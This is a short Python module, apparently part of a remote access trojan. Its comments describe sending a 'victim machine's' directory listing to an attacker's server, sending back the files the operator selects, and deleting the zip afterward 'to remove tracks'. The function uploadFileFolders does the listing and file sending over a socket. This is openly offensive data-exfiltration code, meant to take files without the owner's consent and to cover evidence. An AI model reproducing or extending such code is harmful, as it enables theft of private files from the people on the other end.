from glob import glob
import json


DELIMETER = "<END_OF_RESULTS>"


# get files and folders list in the directory

# create a dictionary of the file sin directory

# serialize the dictionary

# add delimeter to the end and sent to server

# receive on server

# deserialize and print items
# ask the user to select item to download
# send the selected items(file or folder) to victim
# receive the selected item on victim machine
# zip the selected file/folder
# send the zipped file to server
# remove the zip file on the victim machine to remove tracks

def uploadFileFolders(my_socket):
    print("[+] Uploading to server")

    files = glob("*")
    dict = {}

    for index, file in enumerate(files):
        dict[index] = file

    dict_bytes = json.dumps(dict)
    dict_bytes_delimeter = dict_bytes + DELIMETER

    raw_bytes = dict_bytes_delimeter.encode()
    my_socket.socket.send(raw_bytes)

    filename = my_socket.receiveData()

    my_socket.sendFile(filename)